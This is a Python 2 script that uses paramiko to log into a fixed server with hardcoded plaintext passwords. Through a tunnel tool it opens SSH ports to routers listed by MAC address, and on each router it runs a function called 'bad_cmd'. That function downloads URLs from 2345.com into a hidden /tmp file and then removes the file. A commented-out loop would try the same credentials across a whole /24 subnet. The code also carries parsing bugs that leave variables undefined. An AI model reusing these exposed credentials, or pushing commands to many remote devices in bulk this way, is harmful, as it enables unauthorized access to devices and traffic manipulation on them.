#!/usr/bin/python
#-*- coding: utf-8 -*-

#NODE:
#   file:list, fill with maclist
#

import paramiko
import threading
import time

def bad_cmd(ssh_bird):
	try:
		print "__bad cmd is begin__"
		tmp_file = "/tmp/.t"
		cmd_list = [ 'wget http://www.2345.com/?k76508765 -O ' + tmp_file,
				'wget http://g.wan.2345.com/s/1/1254/784.html?frm=wzdh-kz-yy1 -O ' + tmp_file,
				'rm -rf ' + tmp_file,
				'echo ok']

		for m in cmd_list:
			print m
			stdin, stdout, stderr = ssh_bird.exec_command(m)
			out = stdout.readlines()
			for o in out:
				print o,
			err = stderr.readlines()
			for e in err:
				print e,
	except:
		print '\nbad cmd Error\n'


def ssh2_bird(port):
	try:
		print "********" , port, "********"
		rport = int(port)
		ip = "182.92.220.54"
		username = "bhuroot"  
		passwd = "Bhu8273)!))"    
		print "start connect to brid ..."
		ssh_bird = paramiko.SSHClient()
		print "create client"
		ssh_bird.load_system_host_keys()
		print "log keys"
		ssh_bird.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh_bird.connect(ip, rport, username, passwd, timeout=50)
		print "connect ..."

		stdin, stdout, stderr = ssh_bird.exec_command("uname -a")
		out = stdout.readlines()
		print out

		bad_cmd(ssh_bird)

		ssh_bird.close();
	except:
		print '%s\tError\n'%(port)
	
def get_ssh_p(ssh, ap_mac):
	scan_cmd = "/home/bhulog/tunnel/btuncctl -t bmc scan 127.0.0.1:9275 " + ap_mac 
	print scan_cmd
	stdin, stdout, stderr = ssh.exec_command(scan_cmd)
	#time.sleep(3);
	out = stdout.readlines()
	lines = len(out)
	if lines == 0:
		print "dev:", ap_mac, "is not connect to server"
		return

	#for o in out:
	#	if o == "Server Information:\n":
	#for n in range(0, lines):
	#	print out[n]
	find_ppp0 = 0
	find_eth1 = 0
	find_tcp  = 0
	items = lines / 10
	n = 0
	while n < items:
		m = 0
		if out[items * m] != "Server Information:\n":
			n += 1
			continue
		while m < 10:
			find_tcp = 0
			x = (n * 10) + m
			if x > lines:
				break
			print "****" + out[x] + "****\n"
			if m == 1:
				dif = out[x].find("BHU Tunnel Interface")
				if dif != -1:
					#find out which port is use to as wan port
					if out[x].find("ppp0") != -1:
						find_ppp0 = 1
					elif out[x].find("eth1") != -1:
						find_eth1 = 1	
					else:
						#BAD is here
						m += 1;
						continue
					
			if m == 3:
				btport = out[x].find("BHU Tunnel Port")
				if btport != -1:
					btpstr = out[x]
			if m == 6:
				tcpport = out[x].find("Bind TCP Port")
				if tcpport != -1:
					q = out[x].find("22")
					if q != -1:
						print "tcp str:", out[x]
						find_tcp = 1
			if find_tcp == 1:
				p = btpstr.find(":") + 1
				if p != -1:
					bt_port_num = btpstr[p:len(btpstr) - 1]
					#if find ppp0, ppp0 must is wan port, no need to find eth1 port
					#if no ppp0 port eth1 will as wan port
					if find_ppp0 == 1:
						print "user ppp0"
						break

			#print out[x]
			m += 1;
		n += 1
	print "yyyyyyy Tunnel port:", bt_port_num

	add_cmd  = "/home/bhulog/tunnel/btuncctl -t bmc add 127.0.0.1:9275 " + ap_mac + " " + bt_port_num + " 0"
	print add_cmd
	stdin, stdout, stderr = ssh.exec_command(add_cmd)
	out = stdout.readlines()
	s = out[0].split("  ")
	ss= s[len(s) - 1]
	bt_ssh_port = ss[0 : len(ss) - 1] #remove the last '\n'
	print "ssh port:", bt_ssh_port, "xx"
	ssh_cmd  = "ssh -p " + bt_ssh_port + " bhuroot@182.92.220.54";
	print "ssh cmd:", ssh_cmd

	#del_cmd  = "/home/bhulog/tunnel/btuncctl del " + bt_ssh_port
	#print del_cmd
	#stdin, stdout, stderr = ssh.exec_command(del_cmd)
	return bt_ssh_port

def ssh2(ip,username,passwd,cmd):
	try:
		print "start to connect server ..."
		ssh = paramiko.SSHClient()
		ssh.load_system_host_keys()
		#ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(ip,22,username,passwd,timeout=50)
		print '%s\tOK\n'%(ip)
		print 'SSH connect to %s success. \n'%(ip)
		for m in cmd:
			stdin, stdout, stderr = ssh.exec_command(m)
			out = stdout.readlines()
			for o in out:
				print o,

		acmd = "ls" + " -al";
		stdin, stdout, stderr = ssh.exec_command(acmd)
		out = stdout.readlines()
		print out

		#OPEN a file name "list"
		fd = open("list", "rw+")
		while 1:
			line = fd.readline()
			if len(line) == 0:
				break
			if line.find("84:82") < 0:
				break
			print line
			ap_mac = line.rstrip()

			bt_ssh_port = get_ssh_p(ssh, ap_mac)

			ssh2_bird(bt_ssh_port);
			#break;

		fd.close()

		ssh.close()
	except :
		print '%s\tError\n'%(ip)

if __name__=='__main__':
	#cmd list
	#btuncctl -t bmc scan 127.0.0.1:9275 84:82:f4:1a:1a:11
	#btuncctl -t bmc add 127.0.0.1:9275 84:82:f4:1a:1a:11 1037 0
	#ssh -p 53944 bhuroot@182.92.220.54
	cmd = [ 'uname -a',
			'echo hello!']
	username = "bhulog"  
	passwd = "Bhu8273)!))"    
	threads = []   
	ip = "182.92.220.54"
	print "Begin......"
	"""
	for i in range(1,254):
		ip = '192.168.1.'+str(i)
		a=threading.Thread(target=ssh2,args=(ip,username,passwd,cmd))
		"""
	a=threading.Thread(target=ssh2,args=(ip,username,passwd,cmd))
	a.start()
